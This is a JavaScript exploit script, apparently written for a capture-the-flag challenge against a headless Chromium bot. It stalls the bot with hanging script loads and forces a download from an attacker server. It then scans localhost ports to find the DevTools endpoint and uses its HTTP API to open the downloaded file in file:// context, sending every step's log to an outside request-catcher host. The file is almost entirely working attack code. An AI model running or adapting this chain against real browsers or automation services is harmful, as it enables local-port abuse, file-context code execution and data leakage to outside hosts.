(function() {
    'use strict';
    
    const LOG_SERVER = 'https://aab.requestcatcher.com';
    const ATTACKER_SERVER = 'http://intigriti.42web.io/dl.php'; // Your Flask/Node server
    
    // =================================================================
    // LOGGING
    // =================================================================
    
    function log(msg) {
        navigator.sendBeacon(LOG_SERVER + '/log', 
            '[' + new Date().toISOString() + '] ' + msg
        );
        console.log('[EXPLOIT]', msg);
    }
    
    // =================================================================
    // STEP 1: HOLD THE BOT
    // =================================================================
    
    function holdBot() {
        log('🔒 Holding bot with hanging resources...');
        
        for (let i = 0; i < 3; i++) {
            const script = document.createElement('script');
            script.src = 'https://httpstat.us/200?sleep=999999&id=' + i;
            document.head.appendChild(script);
        }
        
        log('✅ Bot is HELD');
    }
    
    holdBot();
    
    // =================================================================
    // STEP 2: TRIGGER AUTO-DOWNLOAD OF hash.HTML
    // =================================================================
    
    function triggerDownload() {
        log('📥 Triggering download of hash.html...');
        
        // Open attacker server that serves hash.html with download headers
        const downloadURL = ATTACKER_SERVER;
        
        // Method 1: Direct window.open (works in new headless)
        window.open(downloadURL, '_blank');
        
        // Method 2: Programmatic link click (backup)
        setTimeout(() => {
            const a = document.createElement('a');
            a.href = downloadURL;
            a.download = 'hash.html';
            a.click();
        }, 500);
        
        log('✅ Download triggered');
    }
    
    triggerDownload();
    
    // =================================================================
    // STEP 3: DISCOVER DEVTOOLS PORT
    // =================================================================
    
    function discoverDevToolsPort() {
        log('🔍 Scanning for DevTools port...');
        
        const START_PORT = 30000;
        const END_PORT = 61000;
        let currentPort = START_PORT;
        
        function probePort() {
            if (currentPort > END_PORT) {
                log('❌ No DevTools port found');
                return;
            }
            
            const testURL = 'http://127.0.0.1:' + currentPort + '/json/list';
            const script = document.createElement('script');
            script.src = testURL;
            
            script.onload = function() {
                log('🎯 DevTools port FOUND: ' + currentPort);
                
                // Port found! Now trigger the exploit
                exploitDevTools(currentPort);
            };
            
            script.onerror = function() {
                // Port not open, try next
                currentPort++;
                probePort();
              log('🎯 DevTools port not FOUND: ' + currentPort);
            };
            
            document.body.appendChild(script);
        }
        
        probePort();
    }
    
    // Wait for download to complete, then scan
    discoverDevToolsPort();
    
    // =================================================================
    // STEP 4: EXPLOIT DEVTOOLS - OPEN hash.HTML IN FILE CONTEXT
    // =================================================================
    
    function exploitDevTools(port) {
        log('🚀 Exploiting DevTools on port ' + port);
        
        // Path where Chromium saves downloads in new headless mode
        const pocPath = 'file:///home/challenge/Downloads/hash.html';
        
        // Use DevTools HTTP API to open the file
        const exploitURL = 'http://127.0.0.1:' + port + '/json/new?' + pocPath;
        
        fetch(exploitURL, {
            method: 'PUT'  // CRITICAL: Must be PUT, not GET!
        })
        .then(response => {
            log('✅ DevTools command sent - poc.html should open now');
            log('Response status: ' + response.status);
        })
        .catch(err => {
            log('❌ DevTools command failed: ' + err.message);
        });
    }
    
    // =================================================================
    // HEARTBEAT
    // =================================================================
    
    let heartbeat = 0;
    setInterval(() => {
        heartbeat++;
        log('💓 Heartbeat #' + heartbeat);
    }, 30000);
    
    log('✅ Exploit script initialized');
    
})();
